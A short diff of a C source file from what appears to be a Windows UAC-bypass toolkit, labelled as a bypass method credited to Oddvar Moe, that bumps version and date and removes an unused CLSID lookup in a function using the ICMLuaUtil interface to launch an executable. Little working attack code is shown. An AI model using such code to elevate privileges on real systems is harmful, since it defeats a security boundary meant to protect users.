@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017
+*  (C) COPYRIGHT AUTHORS, 2017 - 2018
 *
 *  TITLE:       API0CRADLE.C
 *
-*  VERSION:     2.82
+*  VERSION:     2.90
 *
-*  DATE:        02 Nov 2017
+*  DATE:        10 July 2018
 *
 *  UAC bypass method from Oddvar Moe aka api0cradle.
 *
@@ -34,7 +34,6 @@ BOOL ucmCMLuaUtilShellExecMethod(
     HRESULT          r = E_FAIL;
     BOOL             bCond = FALSE;
     IID              xIID_ICMLuaUtil;
-    CLSID            xCLSID_ICMLuaUtil;
     ICMLuaUtil      *CMLuaUtil = NULL;
 
     do {
@@ -42,9 +41,6 @@ BOOL ucmCMLuaUtilShellExecMethod(
         if (lpszExecutable == NULL)
             break;
 
-        if (CLSIDFromString(T_CLSID_CMSTPLUA, &xCLSID_ICMLuaUtil) != NOERROR) {
-            break;
-        }
         if (IIDFromString(T_IID_ICMLuaUtil, &xIID_ICMLuaUtil) != S_OK) {
             break;
         }
